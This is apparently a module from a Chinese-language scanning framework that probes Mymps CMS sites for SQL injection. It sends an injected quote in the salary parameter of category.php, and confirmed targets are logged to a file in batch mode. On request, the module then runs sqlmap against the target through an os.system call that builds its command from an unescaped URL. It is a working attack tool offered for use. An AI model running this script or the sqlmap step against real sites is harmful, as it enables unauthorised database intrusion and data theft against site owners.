#!/user/bin/env python3
# -*- coding: utf-8 -*-

import requests, urllib3
from pub.com.outprint import OutPrintInfo, OutPrintInfoSuc, OutPrintInfoErr
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
from pub.com.output import OutPutFile

urllib3.disable_warnings()

class Mymps_Sql_Scan:
    def get_url(self, input_url):
        try:
            url = input_url + "/category.php?catid=61&salary=1%27%3B"
            req = requests.get(url, headers=self.headers, proxies=self.proxy, verify=self.ssl)
            if "SQL" in req.text:
                if not self.batch:
                    OutPrintInfoSuc("Mymps", '目标存在Mymps cms系统sql注入漏洞')
                    OutPrintInfo("Mymps", url)
                else:
                    OutPrintInfoSuc("Mymps", f'目标存在Mymps cms系统sql注入漏洞: {url}')
                    OutPutFile("mymps_sql.txt", f'目标存在Mymps cms系统sql注入漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("Mymps", f'目标 {input_url} 不存在Mymps cms系统sql注入漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("Mymps", '目标请求出错')
            return False

    def main(self, target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Mymps", '开始检测Mymps cms系统sql注入漏洞...')
        if self.get_url(url):
            if not self.batch:
                choose = Prompt.ask("[b yellow]是否调用sqlmap执行检测([b red]y/n[/b red])")
                if choose == "y":
                    import os
                    try:
                        dir = os.getcwd()
                        OutPrintInfo("SqlMap",
                                     f'[b bright_red]Query[/b bright_red]: \n[b magenta]sqlmap -u "{url}/category.php?catid=61&salary=1%27%3B" --output-dir={dir}/result/ --batch')
                        os.system(
                            f"sqlmap -u \"{url}/category.php?catid=61&salary=1%27%3B\" --output-dir={dir}/result/ --batch")
                    except Exception as e:
                        OutPrintInfoErr(e)
        if not self.batch:
            OutPrintInfo("Mymps", 'Mymps cms系统sql注入检测结束')

